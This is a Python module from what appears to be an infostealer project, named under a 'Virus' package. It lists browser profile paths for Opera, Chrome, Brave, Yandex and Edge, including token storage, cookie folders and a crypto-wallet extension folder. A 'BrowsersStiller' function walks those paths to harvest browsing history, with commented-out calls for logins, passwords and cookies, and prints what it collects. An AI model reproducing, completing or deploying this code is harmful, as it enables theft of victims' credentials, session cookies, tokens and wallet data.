from .Chrome import Chrome
from .FireFox import FireFox
from Virus.Helpers.Support import BrowsersSupport, BrowsersData, roaming, local
from Virus.Helpers.Counter import Count
import os

'                   Default Path < 0 >                            BrowserName < 1 >            Token  < 2 >                   Password < 3 >        Cookies < 4 >                               Extentions < 5 >                                  '
browserPaths = [
    [f"{roaming}\\Opera Software\\Opera GX Stable",                 "OperaGX",          "\\Local Storage\\leveldb",            "\\",              "\\Network",              "\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"         ],
    [f"{roaming}\\Opera Software\\Opera Stable",                    "Opera",            "\\Local Storage\\leveldb",            "\\",              "\\Network",              "\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"         ],
    [f"{roaming}\\Opera Software\\Opera Neon\\User Data\\Default",  "OperaNeon",        "\\Local Storage\\leveldb",            "\\",              "\\Network",              "\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"         ],
    [f"{local}\\Google\\Chrome\\User Data",                         "Chrome",           "\\Default\\Local Storage\\leveldb",   "\\Default",       "\\Default\\Network",     "\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"],
    [f"{local}\\Google\\Chrome SxS\\User Data",                     "ChromeSxS",        "\\Default\\Local Storage\\leveldb",   "\\Default",       "\\Default\\Network",     "\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"],
    [f"{local}\\BraveSoftware\\Brave-Browser\\User Data",           "Brave-Browser",    "\\Default\\Local Storage\\leveldb",   "\\Default",       "\\Default\\Network",     "\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"],
    [f"{local}\\Yandex\\YandexBrowser\\User Data",                  "YandexBrowser",    "\\Default\\Local Storage\\leveldb",   "\\Default",       "\\Default\\Network",     "\\HougaBouga\\nkbihfbeogaeaoehlefnkodbefgpgknn"                       ],
    [f"{local}\\Microsoft\\Edge\\User Data",                        "Edge",             "\\Default\\Local Storage\\leveldb",   "\\Default",       "\\Default\\Network",     "\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"]
]


def BrowsersStiller():
    BrowsersSupport.start()

    for browser in browserPaths:
        if os.path.exists(browser[0]):
            # BrowsersData.get_login_and_password(browser[0], browser[3])
            # BrowsersData.get_cookies(browser[0], browser[4])
            BrowsersData.get_history(browser[0], browser[3], browser[1])

    print(Count.list_of_passwords)
    print(Count.dict_of_history)



